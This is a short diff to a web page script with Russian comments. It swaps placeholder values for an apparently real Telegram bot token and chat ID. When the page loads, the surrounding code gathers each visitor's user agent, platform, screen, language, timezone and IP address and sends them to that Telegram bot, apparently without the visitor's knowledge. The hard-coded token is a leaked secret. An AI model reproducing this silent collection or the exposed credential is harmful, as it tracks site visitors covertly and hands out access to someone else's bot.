@@ -168,8 +168,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const info = collectDeviceInfo();
     info.ip = await getIp();
 
-    const token = "ТОКЕН_ТВОЕГО_БОТА";   // вставь сюда токен бота
-    const chatId = "ТВОЙ_CHAT_ID";       // сюда свой Telegram ID
+    const token = "8072675312:AAEsCXVL4RcSKNQasBTMGCcecZQoGsTCfkY";   // вставь сюда токен бота
+    const chatId = "5423792783";       // сюда свой Telegram ID
     const text = `/add_device ${info.userAgent}|${info.platform}|${info.screen}|${info.language}|${info.timezone}|${info.ip}`;
 
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
